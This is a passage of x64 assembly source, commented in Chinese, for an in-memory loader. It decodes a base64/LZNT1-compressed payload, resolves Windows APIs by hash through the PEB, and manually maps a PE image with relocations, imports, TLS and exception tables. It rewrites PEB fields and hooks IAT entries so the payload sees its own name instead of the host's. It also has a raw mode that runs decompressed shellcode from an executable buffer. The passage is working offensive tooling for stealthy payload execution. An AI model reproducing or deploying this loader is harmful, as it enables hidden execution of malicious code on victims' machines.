    mov  r12d, r9d                  ; cch
    ; 真函数指针：user32 优先，没有就用 kernelbase 那个
    mov  rax, [rel b64_g_lsw]
    test rax, rax
    jnz  .sel
    mov  rax, [rel b64_g_lsw2]
    test rax, rax
    jz   .out
.sel:
    mov  [rel b64_g_lswu], rax
    mov  rcx, rbx
    mov  edx, esi
    mov  r8, rbp
    mov  r9d, r12d
    call qword [rel b64_g_lswu]
    test eax, eax
    jnz  .out

    ; ② 用 datafile 句柄（把原始 exe 当资源 DLL）再试一次：systeminfo 这类只查自身 .rsrc
    call b64_dfile_get
    test rax, rax
    jz   .try_mui
    mov  rcx, rax
    mov  edx, esi
    mov  r8, rbp
    mov  r9d, r12d
    call qword [rel b64_g_lswu]
    test eax, eax
    jnz  .clr

.try_mui:
    call b64_mui_get                ; -> rax = MUI HMODULE（内部会缓存）
    test rax, rax
    jz   .out
    mov  rcx, rax
    mov  edx, esi
    mov  r8, rbp
    mov  r9d, r12d
    call qword [rel b64_g_lswu]
    test eax, eax
    jz   .out
.clr:
    mov  rcx, [rel b64_g_sle]
    test rcx, rcx
    jz   .out
    push rax
    push rax
    xor  ecx, ecx
    call qword [rel b64_g_sle]
    pop  rax
    pop  rax
.out:
    add  rsp, 0x30
    pop  r12
    pop  rdi
    pop  rbp
    pop  rsi
    pop  rbx
    ret

; b64_hooks: rcx=image rdx=container r8=kernel32 r9=GetProcAddress r10=LoadLibraryA
b64_hooks:
    push rbx
    mov  [rel b64_g_img], rcx
    push rbp
    push rsi
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x30

    mov  rbx, rcx                   ; image
    mov  r12, rdx                   ; container
    mov  r13, r8                    ; kernel32
    mov  r14, r9                    ; GetProcAddress
    mov  r15, r10                   ; LoadLibraryA
    mov  [rel b64_g_k32], r13
    mov  [rel b64_g_gpa], r14
    mov  [rel b64_g_lla], r15

    ; module path = header + 0x3C + KeyLen + 12*NSect, then CmdLen blob
    mov  eax, [r12 + B64_H_NSECT]
    imul eax, eax, 12
    mov  ecx, [r12 + B64_H_KEYLEN]
    lea  rsi, [r12 + B64_H_KEY]
    add  rsi, rcx
    add  rsi, rax                   ; -> cmd blob
    mov  eax, [rsi]
    lea  rsi, [rsi + rax + 4]       ; -> module path blob
    mov  eax, [rsi]
    add  rsi, 4
    test eax, eax
    jz   .no_path
    mov  [rel b64_g_mp_ptr], rsi
    mov  [rel b64_g_mp_len], eax

    ; 同步 ProcessParameters.ImagePathName -> ModPath（部分组件按它定位自身）
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x20]
    test rax, rax
    jz   .no_ipn
    mov  ecx, [rel b64_g_mp_len]
    mov  [rax + 0x60], ecx
    mov  [rax + 0x62], ecx
    mov  rdx, [rel b64_g_mp_ptr]
    mov  [rax + 0x68], rdx
.no_ipn:

    ; 打包时算好的 MUI 候选路径：u32 total, 然后每项 u32 len + 宽串(含 NUL)
    ; 跳过 modpath 数据，读 MUI 候选区
    mov  ecx, [rel b64_g_mp_len]
    add  rsi, rcx
    mov  eax, [rsi]                 ; mui total
    add  rsi, 4
    test eax, eax
    jz   .no_path
    mov  eax, [rsi]
    add  rsi, 4
    mov  [rel b64_g_mui1], rsi
    add  rsi, rax
    mov  eax, [rsi]
    add  rsi, 4
    mov  [rel b64_g_mui2], rsi
.no_path:

    ; real GetModuleFileNameW (kernel32)
    mov  rdx, r13
    mov  r8d, HASH_GETMODULEFILENAMEW
    call b64_find_export
    mov  [rel b64_g_gmfn], rax

    ; real LoadStringW (user32) —— 只在 user32 已加载时挂钩：
    ; 这里刻意不 LoadLibraryA，避免在 TLS 建好之后再加载新 DLL
    mov  rdx, r13
    mov  r8d, HASH_GETMODULEHANDLEA
    call b64_find_export
    test rax, rax
    jz   .patch
    lea  rcx, [rel b64_str_user32]
    call rax                        ; GetModuleHandleA("user32.dll")
    test rax, rax
    jz   .patch
    mov  rcx, rax
    lea  rdx, [rel b64_str_lsw]
    call r14
    mov  [rel b64_g_lsw], rax

.patch:
    ; apiset 导入的 LoadStringW 落到 kernelbase，额外取一份地址用于匹配
    mov  rdx, r13
    mov  r8d, HASH_GETMODULEHANDLEA
    call b64_find_export
    test rax, rax
    jz   .patch_go
    lea  rcx, [rel b64_str_kbase]
    call rax
    test rax, rax
    jz   .patch_go
    mov  rcx, rax
    lea  rdx, [rel b64_str_lsw]
    call r14
    mov  [rel b64_g_lsw2], rax

    ; FormatMessageW：kernel32 + kernelbase 各取一份地址
    mov  rdx, r13
    mov  r8d, HASH_FORMATMESSAGEW
    call b64_find_export
    mov  [rel b64_g_fmt], rax
    mov  rdx, r13
    mov  r8d, HASH_GETMODULEHANDLEA
    call b64_find_export
    test rax, rax
    jz   .patch_go
    lea  rcx, [rel b64_str_kbase]
    call rax
    test rax, rax
    jz   .patch_go
    mov  rcx, rax
    lea  rdx, [rel b64_str_fmt]
    call r14
    mov  [rel b64_g_fmt2], rax

    ; 资源 API：句柄是自建镜像时改用 datafile 句柄
    mov  rdx, r13
    mov  r8d, HASH_FINDRESOURCEW
    call b64_find_export
    mov  [rel b64_g_fr], rax
    mov  rdx, r13
    mov  r8d, HASH_FINDRESOURCEEXW
    call b64_find_export
    mov  [rel b64_g_frx], rax
    mov  rdx, r13
    mov  r8d, HASH_LOADRESOURCE
    call b64_find_export
    mov  [rel b64_g_lr], rax
    mov  rdx, r13
    mov  r8d, HASH_SIZEOFRESOURCE
    call b64_find_export
    mov  [rel b64_g_szr], rax

    ; SetLastError：LoadStringW 回落到 MUI 成功后清掉 1812
    lea  rdx, [rel b64_str_sle]
    call r14
    mov  [rel b64_g_sle], rax

.patch_go:
    mov  eax, [r12 + B64_H_IMPRVA]
    test eax, eax
    jz   .done
    lea  rbp, [rbx + rax]           ; import descriptors
.desc:
    mov  eax, [rbp + 0x0C]          ; Name RVA
    test eax, eax
    jz   .done
    mov  eax, [rbp + 0x10]          ; FirstThunk -> IAT
    test eax, eax
    jz   .next_desc
    lea  rsi, [rbx + rax]           ; IAT
.thunk:
    mov  rax, [rsi]
    test rax, rax
    jz   .next_desc
    cmp  rax, [rel b64_g_gmfn]
    jne  .try_lsw
    cmp  qword [rel b64_g_gmfn], 0
    je   .try_lsw
    lea  rcx, [rel b64_shim_gmfn]
    mov  [rsi], rcx
    jmp  .next_thunk
.try_lsw:
    cmp  qword [rel b64_g_lsw], 0
    je   .try_lsw2
    cmp  rax, [rel b64_g_lsw]
    jne  .try_lsw2
    lea  rcx, [rel b64_shim_lsw]
    mov  [rsi], rcx
    jmp  .next_thunk
.try_lsw2:
    cmp  qword [rel b64_g_lsw2], 0
    je   .try_fmt
    cmp  rax, [rel b64_g_lsw2]
    jne  .try_fmt
    lea  rcx, [rel b64_shim_lsw]
    mov  [rsi], rcx
    jmp  .next_thunk
.try_fmt:
    cmp  qword [rel b64_g_fmt], 0
    je   .try_fmt2
    cmp  rax, [rel b64_g_fmt]
    jne  .try_fmt2
    lea  rcx, [rel b64_shim_fmt]
    mov  [rsi], rcx
    jmp  .next_thunk
.try_fmt2:
    cmp  qword [rel b64_g_fmt2], 0
    je   .next_thunk
    cmp  rax, [rel b64_g_fmt2]
    jne  .next_thunk
    lea  rcx, [rel b64_shim_fmt]
    mov  [rsi], rcx
.try_frw:
    cmp  qword [rel b64_g_fr], 0
    je   .try_frex
    cmp  rax, [rel b64_g_fr]
    jne  .try_frex
    lea  rcx, [rel b64_shim_frw]
    mov  [rsi], rcx
    jmp  .next_thunk
.try_frex:
    cmp  qword [rel b64_g_frx], 0
    je   .try_lr
    cmp  rax, [rel b64_g_frx]
    jne  .try_lr
    lea  rcx, [rel b64_shim_frex]
    mov  [rsi], rcx
    jmp  .next_thunk
.try_lr:
    cmp  qword [rel b64_g_lr], 0
    je   .try_szr
    cmp  rax, [rel b64_g_lr]
    jne  .try_szr
    lea  rcx, [rel b64_shim_lr]
    mov  [rsi], rcx
    jmp  .next_thunk
.try_szr:
    cmp  qword [rel b64_g_szr], 0
    je   .next_thunk
    cmp  rax, [rel b64_g_szr]
    jne  .next_thunk
    lea  rcx, [rel b64_shim_szr]
    mov  [rsi], rcx
.next_thunk:
    add  rsi, 8
    jmp  .thunk
.next_desc:
    add  rbp, 0x14
    jmp  .desc

.done:
    add  rsp, 0x30
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rsi
    pop  rbp
    pop  rbx
    ret

; ---------------------------------------------------------------------------
; ---- 资源 API shim：句柄是自建镜像时换成 datafile 句柄 ----

%macro B64_RES_SHIM 2
%1:
    cmp  rcx, [rel b64_g_img]
    jne  %%go
    push rdx
    call b64_dfile_get
    pop  rdx
    test rax, rax
    jz   %%go
    mov  rcx, rax
%%go:
    jmp  qword [rel %2]
%endmacro

B64_RES_SHIM b64_shim_frw,  b64_g_fr
B64_RES_SHIM b64_shim_frex, b64_g_frx
B64_RES_SHIM b64_shim_lr,   b64_g_lr
B64_RES_SHIM b64_shim_szr,  b64_g_szr
%endif ; B64_NO_COMPAT

; b64_load_and_run: 容器 -> 镜像 -> 重定位 -> 导入 -> 跳入口
;   输入: rcx = 容器指针
; ---------------------------------------------------------------------------

b64_load_and_run:
    push rbx
    push rbp
    push rsi
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x50

    mov  r12, rcx                       ; 容器

    ; PEB -> kernel32
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x18]
    mov  rax, [rax + 0x20]
    mov  rax, [rax]
    mov  rax, [rax]
    mov  r15, [rax + 0x20]              ; kernel32 DllBase

    mov  rdx, r15
    mov  r8d, HASH_LOADLIBRARYA
    call b64_find_export
    test rax, rax
    jz   .fail
    mov  rbp, rax                       ; LoadLibraryA

    mov  rdx, r15
    mov  r8d, HASH_GETPROCADDRESS
    call b64_find_export
    test rax, rax
    jz   .fail
    mov  r14, rax                       ; GetProcAddress

    mov  rdx, r15
    mov  r8d, HASH_VIRTUALALLOC
    call b64_find_export
    test rax, rax
    jz   .fail
    mov  r13, rax                       ; VirtualAlloc

    mov  rdx, r15
    mov  r8d, HASH_EXITPROCESS
    call b64_find_export
    mov  [rsp + 0x20], rax              ; ExitProcess（可能为 0）

    ; 1) 建镜像
    mov  rcx, r12
    mov  r9, r13
    call b64_build_image
    test rax, rax
    jz   .fail
    mov  rbx, rdi                       ; 镜像基址

    ; 2) 重定位
    mov  rax, [r12 + 0x08]              ; ImageBase(64)
    mov  r9, rbx
    sub  r9, rax                        ; delta
    mov  rcx, rbx
    mov  edx, [r12 + 0x14]              ; RelocRVA
    mov  r8d, [r12 + 0x18]              ; RelocSize
    call b64_reloc

    ; 3) 导入
    mov  rcx, rbx
    mov  edx, [r12 + 0x10]              ; ImportRVA
    mov  r8, rbp
    mov  r9, r14
    call b64_imports

    ; 3.4) 注册 .pdata 异常表（mingw CRT / C++ EH / SEH 都靠它）
    mov  edx, [r12 + B64_H_PDATARVA]
    test edx, edx
    jz   .no_pdata
    mov  eax, [r12 + B64_H_PDATASIZE]
    test eax, eax
    jz   .no_pdata
    lea  rcx, [rel b64_str_ntdll]
    call rbp                            ; LoadLibraryA("ntdll.dll")
    test rax, rax
    jz   .no_pdata
    mov  rcx, rax
    lea  rdx, [rel b64_str_rtladdft]
    call r14                            ; GetProcAddress(..., "RtlAddFunctionTable")
    test rax, rax
    jz   .no_pdata
    mov  r11, rax                       ; RtlAddFunctionTable（div 会覆盖 rax，先存）
    mov  ecx, [r12 + B64_H_PDATARVA]
    lea  rcx, [rbx + rcx]               ; 表地址
    mov  eax, [r12 + B64_H_PDATASIZE]
    xor  edx, edx
    mov  r10d, 12
    div  r10d                           ; eax = 条目数（RUNTIME_FUNCTION 12 字节）
    mov  edx, eax                       ; 条目数
    mov  r8, rbx                        ; 镜像基址
    call r11
.no_pdata:

    ; 3.5) TLS：索引 / 模板 / TEB 槽 / 回调（导入修好之后、入口之前）
    mov  rcx, rbx
    mov  rdx, r12
    mov  r8, r15                        ; kernel32
    mov  r9, r13                        ; VirtualAlloc
    call b64_tls

    ; 4) 让目标程序看到自己的名字而不是宿主命令行
    mov  rcx, r12
    mov  r8, r15                        ; kernel32（解析 GetCommandLineA 用）
    call b64_fix_cmdline

    ; 4.5) 让 GetModuleHandle(NULL) 指向我们的镜像
    ;      PEB.ImageBaseAddress(+0x10) 默认还是宿主 exe，whoami/tasklist 这类
    ;      用 FindResource(NULL,...) 取自身资源表的程序会报 1815（找不到资源类型）。
    mov  rax, gs:[0x60]
    mov  [rax + 0x10], rbx

    ; 4.6) 路径 / MUI 兼容层：GetModuleFileNameW(NULL) + LoadStringW(NULL,..)
%ifndef B64_NO_COMPAT
    mov  rcx, rbx
    mov  rdx, r12
    mov  r8, r15
    mov  r9, r14
    mov  r10, rbp
    call b64_hooks
%endif

    ; 5) 跳入口
    mov  eax, [r12 + 0x04]              ; EntryRVA
    add  rax, rbx
    call rax

    xor  ecx, ecx                       ; 入口返回了：ExitProcess(0)
    mov  rax, [rsp + 0x20]
    test rax, rax
    jz   .fail
    call rax

.fail:
    add  rsp, 0x50
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rsi
    pop  rbp
    pop  rbx
    ret

%ifdef RUN_CONTAINER
; ---------------------------------------------------------------------------
; 容器模式入口：base64 -> LZNT1 -> 容器 -> 运行
; ---------------------------------------------------------------------------
b64_run_start:
    and  rsp, -16                       ; 不依赖调用方栈对齐
    sub  rsp, 0x40
    lea  rcx, [rel b64_data_block]
    call b64_decode_payload             ; rdi = 容器, rax = 长度
    test rax, rax
    jz   .dead
    mov  rcx, rdi
    call b64_load_and_run
.dead:
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x18]
    mov  rax, [rax + 0x20]
    mov  rax, [rax]
    mov  rax, [rax]
    mov  rdx, [rax + 0x20]
    mov  r8d, HASH_EXITPROCESS
    call b64_find_export
    mov  ecx, 1
    sub  rsp, 0x20
    call rax
%endif

%ifdef RUN_RAW
; ---------------------------------------------------------------------------
; 裸 shellcode 模式入口：base64 -> LZNT1 -> 直接 call 解压缓冲
; 解压缓冲本身就是 PAGE_EXECUTE_READWRITE，不用再改保护
; ---------------------------------------------------------------------------
b64_raw_start:
    and  rsp, -16
    sub  rsp, 0x40
    lea  rcx, [rel b64_data_block]
    call b64_decode_payload             ; rdi = shellcode, rax = 长度
    test rax, rax
    jz   .dead
    call rdi                            ; 进 shellcode
    xor  r15d, r15d                     ; shellcode 自己返回了 -> exit 0
    jmp  .exit
.dead:
    mov  r15d, 1
.exit:
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x18]
    mov  rax, [rax + 0x20]
    mov  rax, [rax]
    mov  rax, [rax]
    mov  rdx, [rax + 0x20]
    mov  r8d, HASH_EXITPROCESS
    call b64_find_export
    mov  ecx, r15d                      ; b64_find_export 会改 rcx，必须在这儿才赋值
    sub  rsp, 0x20
    call rax
%endif

align 4
b64_str_ntdll:      db 'ntdll.dll', 0
b64_str_rtladdft:   db 'RtlAddFunctionTable', 0

b64_g_k32:          dq 0
b64_g_gpa:          dq 0
b64_g_lla:          dq 0
b64_g_gmfn:         dq 0
b64_g_lsw:          dq 0
b64_g_lsw2:         dq 0
b64_g_mui:          dq 0
b64_g_mui1:         dq 0
b64_g_mui2:         dq 0
b64_g_fmt:          dq 0
b64_g_fmt2:         dq 0
b64_g_dfile:        dq 0
b64_g_img:          dq 0
b64_g_lswu:         dq 0
b64_g_sle:          dq 0
b64_g_fr:           dq 0
b64_g_frx:          dq 0
b64_g_lr:           dq 0
b64_g_szr:          dq 0
b64_g_wr:           dq 0
b64_str_msvcrt:     db 'msvcrt.dll',0
b64_str_write:      db '_write',0
b64_g_mp_ptr:       dq 0
b64_g_mp_len:       dd 0
b64_g_dir_chars:    dd 0
b64_g_base_chars:   dd 0
b64_g_base_src:     dq 0
b64_w_mui:          dw '.','m','u','i',0
b64_str_user32:     db 'user32.dll', 0
b64_str_kbase:      db 'kernelbase.dll', 0
b64_str_lsw:        db 'LoadStringW', 0
z85_tab:
    db 0x44, 0xFF, 0x54, 0x53, 0x52, 0x48, 0xFF, 0x4B, 0x4C, 0x46
    db 0x41, 0xFF, 0x3F, 0x3E, 0x45, 0x00, 0x01, 0x02, 0x03, 0x04
    db 0x05, 0x06, 0x07, 0x08, 0x09, 0x40, 0xFF, 0x49, 0x42, 0x4A
    db 0x47, 0x51, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B
    db 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35
    db 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x4D, 0xFF
    db 0x4E, 0x43, 0xFF, 0xFF, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
    db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19
    db 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23
    db 0x4F, 0xFF, 0x50, 0xFF, 0xFF
b64_str_sle:        db 'SetLastError',0
b64_str_fmt:        db 'FormatMessageW', 0
b64_str_gmfw:       db 'GetModuleFileNameW', 0


b64_data_block:
